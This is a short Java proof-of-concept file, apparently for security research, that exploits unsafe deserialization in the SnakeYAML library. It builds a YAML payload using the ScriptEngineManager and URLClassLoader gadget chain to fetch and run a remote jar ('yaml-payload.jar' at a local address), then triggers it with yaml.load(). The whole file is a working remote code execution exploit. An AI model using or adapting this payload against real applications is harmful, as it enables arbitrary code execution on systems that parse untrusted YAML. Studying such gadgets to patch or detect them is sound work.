import org.yaml.snakeyaml.Yaml;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2024/12/19
 */
public class SnakeYaml_ScriptEngineManager {
    public static void main(String[] args) {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8080/yaml-payload.jar\"]]]]\n";
        Yaml yaml =new Yaml();
        yaml.load(poc);
    }
}
